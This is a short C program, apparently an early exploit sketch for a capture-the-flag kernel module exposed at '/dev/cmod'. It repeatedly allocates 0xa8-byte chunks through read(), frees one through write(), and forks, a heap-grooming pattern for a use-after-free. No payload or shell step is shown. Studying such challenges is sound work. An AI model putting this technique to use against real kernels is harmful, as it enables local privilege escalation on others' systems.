#include<stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <signal.h>

#define DEVICE_FILE "/dev/cmod"
int fd;
void alloc(unsigned long size){
	read(fd,NULL,size);
}
void delete(){
	write(fd,NULL,0);
}
int main(){
	fd=open(DEVICE_FILE,O_RDWR);
	for(int i=0;i<5;i++){
		alloc(0xa8);
	}
	alloc(0xa8);
	int ffd=fork();
	delete();
	int ffd2=fork();
	return 0;
}
